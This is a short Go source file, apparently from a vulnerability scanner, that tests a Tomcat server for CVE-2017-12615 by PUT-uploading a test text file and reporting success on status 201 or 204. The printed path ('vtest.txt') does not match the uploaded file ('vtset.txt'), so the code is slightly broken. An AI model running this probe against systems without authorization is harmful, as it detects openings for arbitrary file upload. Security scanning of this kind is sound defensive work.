package tomcat

import (
	"fmt"
	"github.com/veo/vscan/exp"
)

func CVE_2017_12615(url string) bool {
	if req, err := exp.HttpRequset(url+"/vtset.txt", "PUT", "test"); err == nil {
		if req.StatusCode == 204 || req.StatusCode == 201 {
			fmt.Printf("tomcat-exp-sucess|CVE_2017_12615|--\"%s/vtest.txt\"\n", url)
			return true
		}
	}
	return false
}
